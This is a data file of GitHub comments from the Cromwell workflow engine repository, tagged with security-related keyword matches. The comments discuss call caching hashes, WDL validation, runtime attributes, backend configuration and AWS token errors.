Security,"In terms of demonstrating concurrency, I'd be happy with having the code currently in the `CheckExecutionStatus` handler log the calls it thinks are runnable and having the test scrape the logs to validate correctness. Initially this should be just `ps`, subsequently it should be both `cgrep` and `wc` **at the same time**. I don't care if `cgrep` and `wc` actually run at the same time, I just care that this logic realizes they both become runnable at the same time. Making these things actually run concurrently would likely be fairly involved, especially given my currently weak Akka TestKit-fu.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297:197,validat,validate,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297,1,['validat'],['validate']
Security,"In the scatter PR I needed to create a ""Workflow level WDL functions"" (or whatever we want to call it) to evaluate the scatter collection expression, and I gave it the default local filesystem, which effectively makes this supported. ; https://github.com/broadinstitute/cromwell/pull/818/files#diff-04167311d295d2ed1ab92a70830d9a8dR19. Should I remove it until we figure out if this is a potential security flaw ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461055:398,secur,security,398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461055,1,['secur'],['security']
Security,"Indeed, the following workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:201,validat,validate,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,1,['validat'],['validate']
Security,"Interesting point!. I like the ~~idea~~ philosophy of CC tables being engine only, and queries being completely and solely calculable from metadata. It would probably mean ~~piping~~ forwarding all CC hashes, toggles of ""allowResultReuse"", failures to copy results, etc to the metadata.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306897781:201,hash,hashes,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306897781,1,['hash'],['hashes']
Security,"Is the FoFN itself important, or is it more about inputting things without localizing them? We were considering earlier something like a `FileRef` type:; ```; workflow foo {; Array[Int] indices; scatter (i in indices) {; call mkfile { input: mkfile_input = i }; }; call use_files { input: fileRefs = mkfile.f }; }. task mkfile {; Int mkfile_input; command { ... }; output {; File f = outfile; }; }. task use_files {; Array[FileRef] fileRefs; command { ... }; }; ```. The `FileRef` would be hashed like a `File` for call caching but not localized by Cromwell to run the task",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305898548:490,hash,hashed,490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305898548,1,['hash'],['hashed']
Security,Is there an equivalent for JES runtime attributes validation that could need an update as well ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264853068:50,validat,validation,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264853068,1,['validat'],['validation']
Security,"Is there an example of how to set call caching to true and allowResultReuse to true in the `-o options` file when running a workflow. I am looking for examples and the documentation and I just keep guessing. Both ways of setting outside of `callCaching` and inside still have my `-m metadata` file showing below:; ```. ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. options.json file:; ```; {; 	""default_runtime_attributes"": {; 		""write_to_cache"": true,; 		""read_from_cache"": true,; 		""system.file-hash-cache"": true,; 		""allowResultReuse"" : true,; 		""callCaching"": {; 			""hit"": false,; 			""effectiveCallCachingMode"": ""ReadAndWriteCache"",; 			""result"": ""Cache Miss"",; 			""allowResultReuse"": true; 		}; 	}; }; ```. EDIT:; This only worked by creating a config file with lines:; ```; call-caching {; enabled = true; }; ```; If this is required, shouldn't this documentation [page](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/) include that information under section ""Call Caching Options""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913:552,hash,hash-cache,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913,1,['hash'],['hash-cache']
Security,"It can run the task without having its hash, it just won't try to call cache it nor write it to the cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808:39,hash,hash,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808,1,['hash'],['hash']
Security,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:85,expose,exposed,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833,2,"['access', 'expose']","['accessed', 'exposed']"
Security,"It just goes back to the point of the metadata architecture. It's entire intention is to be write once and then read only. People should also not be blindly removing things from it either. Totally agree w/ your 2nd paragraph but the ""remove stuff from metadata"" option is a pretty fundamental change - there are other ways to attack it if it's an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329037148:326,attack,attack,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329037148,1,['attack'],['attack']
Security,"It ran the task and I don't see how it could have done that otherwise.. On Fri, Aug 11, 2017 at 10:13 AM, Thib <notifications@github.com> wrote:. > I'm pretty sure if you see this message it means that it wasn't able to; > get the hash at all; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk3eHGDQKVm_OJyuRuQ8i9BrfJ1bqks5sXGGJgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321825726:231,hash,hash,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321825726,1,['hash'],['hash']
Security,"It seems Cromwell is converting the undefined optional string as ""null"" since the inputs for the call are:; ```; ""inputs"": {; ""dockerStr"": ""null""; }; ```. Currently, when one uses optional's for other runtime attributes (such as disks or cpu), the job refuses to run as the JES backend requires values for both, the same way it requires a value for docker. It seems like due to the validation being run on non-docker attributes, when they have missing optional values, the job won't run. Since there is no validation for the docker string, Cromwell is trying to force the optional value as the docker value. It might be best if there was light layer of validation for the docker key which differentiated between a user given value vs an undefined optional. In the case of the optional, it would be good if it failed to run the job so that it would be consistent with the behavior of the other runtime attributes when they fail validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2564#issuecomment-324371179:382,validat,validation,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2564#issuecomment-324371179,4,['validat'],['validation']
Security,It won't start new lookups but it won't cancel the other hash lookups in the same batch either.; With the current implementation doing that (cancelling lookups for files in the same batch) would be pretty hard.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324170143:57,hash,hash,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324170143,1,['hash'],['hash']
Security,"It would appear that I forgot ValidateActor, and I should probably not skip the PerRequest stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134034234:30,Validat,ValidateActor,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134034234,1,['Validat'],['ValidateActor']
Security,"It would be nice to have some more documentation about this. When I first logged in this morning, I couldn't access the board, so I tried creating an account and that also failed initially for an _unexpected error, please try again later_ sort of thing. . Also, what board do we create Cromwell issues under? My best guess is `Jira Support` and that's where I created my issue: [Cromwell (server) loses ability to poll some workflows](https://broadworkbench.atlassian.net/browse/JS-34), but all of the other issues aren't really Cromwell related. A ""query"" field might also be useful. . These are the boards currently on Jira:; - `Batch Analysis`; - `Cloud Accounts`; - `Data-repo`; - `DevOps`; - `DSP-ELT Backlog`; - `Interactive Analysis`; - `Jira Support`; - `New Project`; - `PERF`; - `PRODUCTION`; - `QA`; - `SAND-NG`; - `SANDBOX`; - `SUPPORT`; - `TERRA ROADMAP`; - `TerraUI`; - `User Metrics`; - `UX`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778:109,access,access,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502892778,2,['access'],['access']
Security,"It would be nice to have this information available from the command line too, i.e. a -version flag that dumps the version/hash and exits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1694#issuecomment-262027405:123,hash,hash,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1694#issuecomment-262027405,1,['hash'],['hash']
Security,"It's a bit more than that - there may be other parts of Cromwell that don't work with proxies. New such places may also appear unexpectedly due to non-testing. In other words, I strongly suggest trying to give Cromwell unrestricted Internet access first.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722:241,access,access,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722,1,['access'],['access']
Security,"It's currently cheap to `==` `Scope`s since matches satisfy instance equality and misses fail quickly, so filtering `List`s of `Scope`s is not an issue. It's the deep `hashCode` computation to determine map buckets that's the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-255131528:168,hash,hashCode,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-255131528,1,['hash'],['hashCode']
Security,"It's entirely possible that this resolves all of the big bang problems, including the spray responsiveness. From what I saw yesterday the pain and suffering was primarily coming from the DB access.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180509918:190,access,access,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180509918,2,['access'],['access']
Security,It's expected that `wdltool 0.4` will not validate this as the `String main_output = hello_and_goodbye.hello_output` syntax in workflow outputs was introduced specifically for sub workflows which `wdltool 0.4` pre-dates.; Try to update to the latest version of wdltool and it should validate.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261:42,validat,validate,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261,2,['validat'],['validate']
Security,"It's not required by the spec per se, but it is required in order to be runnable so presumably what womtool is doing is validating ""can this be run"" instead of ""is this correct syntax"". @cjllanwarne Something to consider, those two things aren't **quite** the same.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-396605877:120,validat,validating,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-396605877,1,['validat'],['validating']
Security,"It's possible that CaaA will both (1) directly expose the Cromwell API and (2) allow hooking in to Terra services such as email. . I filed tickets for this (requires Broad login): [CaaA direct access](https://broadworkbench.atlassian.net/browse/WM-1909), [CaaA email notifs](https://broadworkbench.atlassian.net/browse/WM-1910). Since both of those stories refer to future work in not-Cromwell, I'm going to close this issue for now and we can continue the conversation there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1678#issuecomment-1508942159:47,expose,expose,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1678#issuecomment-1508942159,2,"['access', 'expose']","['access', 'expose']"
Security,"Jeff -- thanks for following up and confirming I wasn't missing anything. I realized I was testing on this system with a custom local build so swapped over to the pre-build conda package, and magically, the problem morphed into #3584. I'm very confused but don't think this is reproducible now so will close. Now only the null file hashing issue is causing trouble. Sorry for wasting your time looking at this and thanks again for all the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-389261690:332,hash,hashing,332,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-389261690,1,['hash'],['hashing']
Security,"JobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }; ```; Thanks for any tips or pointers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:5091,hash,hashing-strategy,5091,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['hash'],['hashing-strategy']
Security,JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 			at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:176); 			at wdl4s.Call$$anonfun$lookupFunction$1.ap,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4457,Validat,ValidationException,4457,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Validat'],['ValidationException']
Security,"Just noticed, this PR uses different hashes for conformance tests for Local / PapiV1 / PapiV2. I'm assuming that was not intentional. I have an incoming PR (as soon as PRs quiet down + I get travis to pass for once) that refactors this into reusable includes. That will hopefully help making CI changes in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660:37,hash,hashes,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660,1,['hash'],['hashes']
Security,Just to note that it might be slightly not backward compatible as people who have their accounts set up such that they gave the default compute service account access to the data they need will now also have to ensure the `user_service_account` also has access to the data (which may already be the case but..); Otherwise it should be pretty straightforward to do.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3085#issuecomment-353350550:160,access,access,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3085#issuecomment-353350550,2,['access'],['access']
Security,"K.I.S.S. indeed. 👍 to the code diff. Your comments do help, but I'm still only at about 75% in understanding of what initialization actors can and cannot validate currently. I'm fine if folks file issues with example ""enhancements"" for the future. One could also write a large suite of tests with runtime attribute expressions that should and should not validate, but that's another ticket to be prioritized. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1240/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516:154,validat,validate,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516,2,['validat'],['validate']
Security,"Latest on aws_backend branch. ________________________________; From: mcovarr <notifications@github.com>; Sent: Thursday, June 7, 2018 6:47:04 AM; To: broadinstitute/cromwell; Cc: Thomas Dyar (EXTERNAL); Author; Subject: Re: [broadinstitute/cromwell] Strange ""Boxed Error"", probably authorization / config (#3736). Also what version of Cromwell is this?. —; You are receiving this because you authored the thread.; Reply to this email directly, view it on GitHub<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_broadinstitute_cromwell_issues_3736-23issuecomment-2D395377185&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=U0Ofhj4NWKhfebpsRfeTCvMxBZRUhJ44bevIpm6SR-E&e=>, or mute the thread<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_notifications_unsubscribe-2Dauth_AIfLudmaJuhICx-5FxkNqusXZWh8pJ14zvks5t6QSogaJpZM4UdPeJ&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=qPDfKyTsVifxuNzZbVjE9HCwrHl6ANQrTo9wh-9YTJE&e=>.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027:283,authoriz,authorization,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027,1,['authoriz'],['authorization']
Security,"Le sigh. Need to now fix ""Method DELETE is not allowed by Access-Control-Allow-Methods."" back in lenthall. Brb. Again.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/250#issuecomment-150628371:58,Access,Access-Control-Allow-Methods,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/250#issuecomment-150628371,1,['Access'],['Access-Control-Allow-Methods']
Security,"Linking vs not doing anything still does have an impact regarding call caching.; For example, currently on SFS if you use the ""hash the file path"" strategy, then you have to use symlink in order for it to work otherwise we have no way to know the original file path and hence call caching breaks. If we provided the ""don't do anything option"" on SFS too it would be another way to get call caching to work with ""file path hashing"".; I'm just saying there is a soup of options regarding hashing and file duplication that would be nice to get as coherent as possible (even though like you said linking on GCS doesn't make sense). And I agree that all of this might very well be an implementation detail :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306249534:127,hash,hash,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306249534,3,['hash'],"['hash', 'hashing']"
Security,"Log message that gets repeated over and over:. 2020-01-08 15:15:57,852 cromwell-system-akka.actor.default-dispatcher-28 ERROR - Failure fetching statuses for AWS jobs in Initializing. No updates will occur.; software.amazon.awssdk.services.batch.model.BatchException: The security token included in the request is expired (Service: Batch, Status Code: 403, Request ID: 6312adeb-b603-48ff-8a3b-fd099e6805ef); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-572126033:272,secur,security,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-572126033,1,['secur'],['security']
Security,"Logs:; 2019-10-09 14:05:52,263 cromwell-system-akka.actor.default-dispatcher-2 ERROR - Failure fetching statuses for AWS jobs in Initializing. No updates will occur.; software.amazon.awssdk.services.batch.model.BatchException: The security token included in the request is expired (Service: Batch, Status Code: 403, Request ID: 842776aa-1862-43dc-a286-95d0b902319e); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.ht",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:231,secur,security,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,1,['secur'],['security']
Security,"Looking at the existing `JobPreparationActor` code I saw that the Docker hash credentials are being created by calling this method in `BackendLifecycleActorFactory`:; ```; def dockerHashCredentials(initializationDataOption: Option[BackendInitializationData]): List[Any] = List.empty; ```; The JES backend overrides this to return a non-empty `List`. Since we don't yet have the required `BackendInitializationData` during workflow materialization, @Horneth suggested the Docker hash calculation be performed slightly downstream in workflow initialization instead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621:73,hash,hash,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621,2,['hash'],['hash']
